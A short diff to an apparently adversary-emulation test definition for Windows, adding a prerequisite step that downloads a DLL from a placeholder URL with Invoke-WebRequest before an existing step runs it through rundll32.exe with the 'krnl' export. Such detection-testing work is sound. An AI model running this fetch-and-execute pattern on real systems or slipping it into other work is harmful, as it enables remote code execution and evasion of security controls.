@@ -22,6 +22,12 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: The DLL file to be called must exist at the specified location (#{dll_file})
+      inline: |-
+        if (Test-Path "#{dll_file}") {exit 0} else {{New-Item -Type Directory (split-path "#{dll_file}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "#{dll_url}" -OutFile "#{dll_file}"
+        }}
+      executor: powershell
     - name: running-dll-with-.init-extension-and-function
       inline: |
         rundll32.exe {{.Args.dll_file}},krnl
